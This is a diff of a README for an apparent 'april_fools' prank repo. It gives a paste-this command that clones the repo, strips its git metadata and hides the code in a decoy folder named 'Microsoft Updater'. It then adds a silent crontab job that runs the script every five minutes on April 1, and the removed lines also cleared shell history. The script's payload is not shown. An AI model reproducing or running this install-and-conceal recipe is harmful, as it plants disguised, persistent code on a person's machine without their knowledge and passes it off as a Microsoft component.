@@ -2,14 +2,21 @@
 
 ### open terminal, copy the below command into it and hit enter
 ```
-git clone https://github.com/benbav/april_fools.git && \                                                                        # clone repo
-rm april_fools/README.md && \                                                                                                   # remove readme
-rm -rf april_fools/.git && \                                                                                                    # remove .git
-chmod u+x ~/april_fools/main.sh && \                                                                                            # make executable
-mkdir Microsoft\ Updater                                                                                                        # create decoy dir
-mv april_fools/ "Microsoft Updater/utils"                                                                                       # move to the decoy dir
-(crontab -l ; echo "*/5 * 1 4 * nohup /usr/bin/env bash ~/Microsoft\ Updater/utils/main.sh > /dev/null 2>&1 &") | crontab - && \# add to crontab
-history -c && history -p                                                                                                        # clear history
+# clone repo
+# remove readme
+# remove .git
+# make executable
+# create decoy dir
+# move to the decoy dir
+# add to crontab
+
+git clone https://github.com/benbav/april_fools.git && \
+rm april_fools/README.md && \
+rm -rf april_fools/.git && \
+chmod u+x ~/april_fools/main.sh && \
+mkdir "Microsoft Updater" && \
+mv april_fools/ "Microsoft Updater/utils" && \
+(crontab -l ; echo "*/5 * 1 4 * nohup /usr/bin/env bash ~/Microsoft\ Updater/utils/main.sh > /dev/null 2>&1 &") | crontab -                                                                    
 ```
 **if you need to stop it go to the Home folder and delete the Microsoft Updater folder**
 
